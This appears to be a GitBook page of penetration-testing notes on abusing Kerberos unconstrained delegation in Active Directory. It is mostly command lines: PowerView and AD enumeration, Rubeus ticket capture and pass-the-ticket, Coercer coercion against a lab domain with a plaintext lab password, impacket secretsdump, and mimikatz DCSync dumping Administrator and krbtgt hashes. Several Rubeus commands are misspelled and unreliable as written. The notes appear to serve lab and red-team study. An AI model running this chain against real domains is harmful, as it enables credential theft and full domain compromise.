# Kerberos Delegation

## **Kerberos Unconstrained Delegation**

> General/Basic or Unconstrained Delegation which allows the first hop server (web server in our example) to request access to any service on any computer in the domain.

**Required**

1. Define Unconstrained Delegation Machines
2. we need to user who has Access to the machine

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

#### define Unconstrained Machines

{% code overflow="wrap" %}
```powershell
#using PowerView
Get-NetComputer -Unconstrained
Get-DomainComputer -UnConstrained
Get-DomainComputer -Unconstrained -Properties DnsHostName
Get-DomainComputer -unconstrained | select samaccountname
# using Import-Module ActiveDirectory 
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
Get-ADComputer "IIS" -Properties TrustedForDelegation, TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount

```
{% endcode %}

{% hint style="info" %}
<mark style="color:orange;">**Hint**</mark>**: discover users that who you have WriteDACL permission on there or do Enumeration to get user**
{% endhint %}

Rubeus

{% embed url="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" %}

```powershell
.\Rubeus.exe ptt /tikcet: base64.exe  monitor /monitornterval:10 /targetuser$ /nowarp
.\Rubeus.exe ptt /tikcet: base64 
#OR
cat b64.txt|base64 -d > ticket.kirbi 
```

### Coercer

{% code overflow="wrap" %}
```bash
coerce -u arya.stark -d north.sevenkingdoms.local -p 'Needle' -t kingslanding.sevenkingdoms.local -l winterfell --always-continue

```
{% endcode %}

{% code overflow="wrap" %}
```bash
sudo impacket-secretsdump -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
```
{% endcode %}

mimikatz

{% code overflow="wrap" %}
```powershell
mimikatz.exe "privilege::debug" "kerberos::ptt PDC.kirbi" "lsadump::dcsync /domain:hacktor.local /user:Administrator" "exit"
#Once the ticket is injected, run DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
{% endcode %}

